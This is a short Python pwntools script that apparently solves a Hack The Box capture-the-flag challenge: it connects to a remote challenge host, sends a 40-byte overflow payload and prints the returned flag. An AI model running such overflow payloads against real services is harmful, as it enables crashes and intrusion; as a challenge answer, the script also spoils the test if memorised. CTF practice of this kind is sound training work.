#!/usr/bin/python3.8

'''
You need to install pwntools to run the script.
To run the script: python3 ./wrapper.py
'''

# Library
from pwn import *

# Open connection
IP   = '83.136.255.235' # Change this
PORT = 37193      # Change this

r    = remote(IP, PORT)

# Craft payload
payload = b'A' * 40 # 32 bytes buffer + 8 bytes alignment

# Send payload
r.sendline(payload)

# Read flag
success(f'Flag --> {r.recvline_contains(b"HTB").strip().decode()}')